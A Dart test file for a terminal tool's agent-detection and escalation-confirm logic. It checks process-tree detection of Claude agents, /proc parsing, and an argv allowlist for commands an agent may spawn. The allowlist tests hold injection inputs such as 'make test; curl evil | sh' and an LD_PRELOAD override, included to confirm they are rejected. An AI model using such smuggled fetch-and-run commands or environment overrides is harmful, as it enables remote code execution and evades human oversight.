/// Agent detection for the escalation confirm (D-115).
library;

import 'dart:io';

import 'package:clide/src/daemon/escalation.dart';
import 'package:test/test.dart';

void main() {
  group('ProcessTreeAgentDetector', () {
    // shell(10) ← claude(20) ← bash tool(30) ← clide cli(40); user shell(50) ← init(1)
    final tree = <int, ProcessEntry>{
      40: (ppid: 30, name: 'clide', argv: ['clide', 'pane', 'spawn'], start: '400'),
      30: (ppid: 20, name: 'bash', argv: ['bash', '-c', 'clide pane spawn'], start: '300'),
      20: (ppid: 10, name: 'claude', argv: ['claude', '--input-format', 'stream-json'], start: '200'),
      10: (ppid: 1, name: 'clide', argv: ['/opt/clide/clide'], start: '100'),
      50: (ppid: 1, name: 'bash', argv: ['bash'], start: '500'),
      60: (ppid: 1, name: 'node', argv: ['node', '/usr/lib/node_modules/@anthropic-ai/claude-code/cli.js'], start: '600'),
      61: (ppid: 60, name: 'sh', argv: ['sh'], start: '610'),
    };
    final detector = ProcessTreeAgentDetector(reader: (pid) async => tree[pid]);

    test('a call descending from claude is an agent, keyed to that process', () async {
      final a = await detector.agentOf(40);
      expect(a!.key, 'claude:20@200');
      expect(a.label, contains('20'));
    });

    test('the user\'s own shell is not an agent', () async {
      expect(await detector.agentOf(50), isNull);
    });

    test('Claude Code run under node counts too', () async {
      expect((await detector.agentOf(61))!.key, 'claude:60@600');
    });

    test('an unknown pid, or one that cannot be read, counts as an agent', () async {
      expect(await detector.agentOf(null), ProcessTreeAgentDetector.unknownAgent);
      expect(await detector.agentOf(999), ProcessTreeAgentDetector.unknownAgent);
    });

    test('a walk that loses the chain part-way stops without an agent', () async {
      final broken = ProcessTreeAgentDetector(reader: (pid) async => pid == 5 ? (ppid: 6, name: 'sh', argv: const <String>[], start: null) : null);
      expect(await broken.agentOf(5), isNull);
    });

    test('the walk stops at clide itself, so a clide launched by an agent does not make every pane an agent', () async {
      // claude(5) → make → clide app(10) → user shell(11) / hosted claude(12) → bash(13)
      final launched = <int, ProcessEntry>{
        5: (ppid: 1, name: 'claude', argv: ['claude'], start: '5'),
        10: (ppid: 5, name: 'clide', argv: ['clide'], start: '10'),
        11: (ppid: 10, name: 'bash', argv: ['bash'], start: '11'),
        12: (ppid: 10, name: 'claude', argv: ['claude'], start: '12'),
        13: (ppid: 12, name: 'bash', argv: ['bash'], start: '13'),
      };
      final d = ProcessTreeAgentDetector(reader: (pid) async => launched[pid], stopAt: 10);
      expect(await d.agentOf(11), isNull, reason: 'the user\'s pane shell');
      expect((await d.agentOf(13))!.key, 'claude:12@12', reason: 'a hosted session below clide is still found');
    });

    test('a self-parented process ends the walk', () async {
      final loop = ProcessTreeAgentDetector(reader: (pid) async => (ppid: pid, name: 'x', argv: const <String>[], start: null));
      expect(await loop.agentOf(7), isNull);
    });
  });

  group('readProcEntry', () {
    late Directory proc;
    setUp(() => proc = Directory.systemTemp.createTempSync('clide-proc-'));
    tearDown(() => proc.deleteSync(recursive: true));

    void fake(int pid, String stat, List<String> argv) {
      final d = Directory('${proc.path}/$pid')..createSync();
      File('${d.path}/stat').writeAsStringSync(stat);
      File('${d.path}/cmdline').writeAsStringSync('${argv.join('\u0000')}\u0000');
    }

    test('parses ppid, a comm with spaces and parens, argv and start time', () async {
      final fields = List.filled(20, '0');
      fields[1] = '77'; // ppid
      fields[19] = '123456'; // starttime
      fake(42, '42 (my (odd) proc) S ${fields.sublist(1).join(' ')}', ['claude', '-p']);
      final e = (await readProcEntry(42, procRoot: proc.path))!;
      expect(e.ppid, 77);
      expect(e.name, 'my (odd) proc');
      expect(e.argv, ['claude', '-p']);
      expect(e.start, '123456');
    });

    test('a missing or malformed entry reads as null', () async {
      expect(await readProcEntry(1234, procRoot: proc.path), isNull);
      fake(43, 'garbage', const []);
      expect(await readProcEntry(43, procRoot: proc.path), isNull);
    });
  });

  test('defaultProcessReader reads this very process', () async {
    final e = await defaultProcessReader(pid);
    expect(e, isNotNull);
    expect(e!.ppid, greaterThan(0));
  }, testOn: 'linux || mac-os');

  // D-115: an app-scope list of commands an agent may start without the
  // confirm, matched against the exact argv — never a shell string.
  group('spawnAllowlisted', () {
    const allow = ['make test', 'flutter test *', 'dart format .'];

    test('an exact entry matches only that argv', () {
      expect(spawnAllowlisted(allow, argv: ['make', 'test']), isTrue);
      expect(spawnAllowlisted(allow, argv: ['make', 'test', 'extra']), isFalse);
      expect(spawnAllowlisted(allow, argv: ['make']), isFalse);
    });

    test('a trailing * allows any further arguments, and none', () {
      expect(spawnAllowlisted(allow, argv: ['flutter', 'test', 'test/a_test.dart']), isTrue);
      expect(spawnAllowlisted(allow, argv: ['flutter', 'test']), isTrue);
      expect(spawnAllowlisted(allow, argv: ['flutter', 'run']), isFalse);
    });

    test('shell tricks are just arguments that fail to match', () {
      expect(spawnAllowlisted(allow, argv: ['sh', '-c', 'make test; curl evil | sh']), isFalse);
      expect(spawnAllowlisted(allow, argv: ['make', 'test;', 'rm']), isFalse);
    });

    test('an env or cwd override never matches', () {
      expect(spawnAllowlisted(allow, argv: ['make', 'test'], env: const {'LD_PRELOAD': '/x.so'}), isFalse);
      expect(spawnAllowlisted(allow, argv: ['make', 'test'], cwd: '/etc'), isFalse);
      expect(
        spawnAllowlisted(allow, argv: ['make', 'test'], env: const {}),
        isTrue,
        reason: 'an empty env is no override',
      );
    });

    test('blank and malformed entries allow nothing', () {
      expect(spawnAllowlisted(const ['', '   ', '*'], argv: ['anything']), isFalse);
    });
  });

  test('CallerInfo classifies once, lazily', () async {
    var calls = 0;
    final c = CallerInfo(
      pid: 1,
      detector: _Counting(() {
        calls++;
      }),
    );
    expect(calls, 0);
    await c.agent();
    await c.agent();
    expect(calls, 1);
  });
}

class _Counting implements AgentDetector {
  _Counting(this.onCall);
  final void Function() onCall;

  @override
  Future<AgentIdentity?> agentOf(int? pid) async {
    onCall();
    return null;
  }
}
